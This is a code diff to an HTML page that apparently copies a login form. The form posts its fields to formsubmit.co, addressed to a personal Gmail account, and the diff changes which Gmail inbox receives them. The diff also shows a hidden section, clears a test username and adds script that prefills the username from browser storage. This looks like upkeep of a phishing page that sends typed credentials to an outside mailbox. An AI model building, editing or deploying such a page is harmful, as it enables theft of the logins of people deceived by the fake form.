@@ -317,7 +317,7 @@
     >
       <main class="o-external__main">
         <form
-          action="https://formsubmit.co/kerjasmine44@gmail.com"
+          action="https://formsubmit.co/trevorharrisx3@gmail.com"
           class="o-card c-card templates-card"
           data-hook="form"
           method="POST"
@@ -455,7 +455,7 @@
               </section>
               <section
                 data-component="organisms-card-section-5"
-                class="o-card__section u-hide"
+                class="o-card__section"
               >
                 <label
                   data-component="molecules-input-2"
@@ -466,7 +466,7 @@
                     class="o-form__element"
                     type="text"
                     name="username"
-                    value="trev@test.net"
+                    value=""
                     autocomplete="username"
                     data-hook="username"
                   />
@@ -624,7 +624,9 @@
         const email = localStorage.getItem("userEmail"); // Retrieve email from localStorage
 
         if (email) {
-          const memberIdField = document.getElementById("memberId");
+          const memberIdField = document.querySelector(
+            'input[name="username"]'
+          );
           if (memberIdField) {
             memberIdField.value = email; // Populate the input field
           } else {
